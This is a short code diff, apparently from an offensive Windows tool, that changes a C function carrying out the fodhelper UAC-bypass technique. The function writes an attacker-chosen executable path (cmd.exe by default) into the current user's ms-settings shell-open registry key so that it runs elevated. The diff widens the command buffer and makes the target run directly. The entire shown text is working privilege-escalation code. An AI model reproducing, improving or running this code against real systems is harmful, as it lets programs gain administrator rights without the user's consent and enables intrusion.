@@ -15,8 +15,8 @@ int FodHelperAbuseEscalationInternal(const char* execPath) {
     const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
     const char* defaultExec = "C:\\Windows\\System32\\cmd.exe";
     const char* target = (execPath != NULL && execPath[0] != '\0') ? execPath : defaultExec;
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "cmd /c start %s", target);
+    char cmd[4096];
+    snprintf(cmd, sizeof(cmd), "%s", target);
     const char* del = "";
 
     LSTATUS stat = RegCreateKeyExA(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
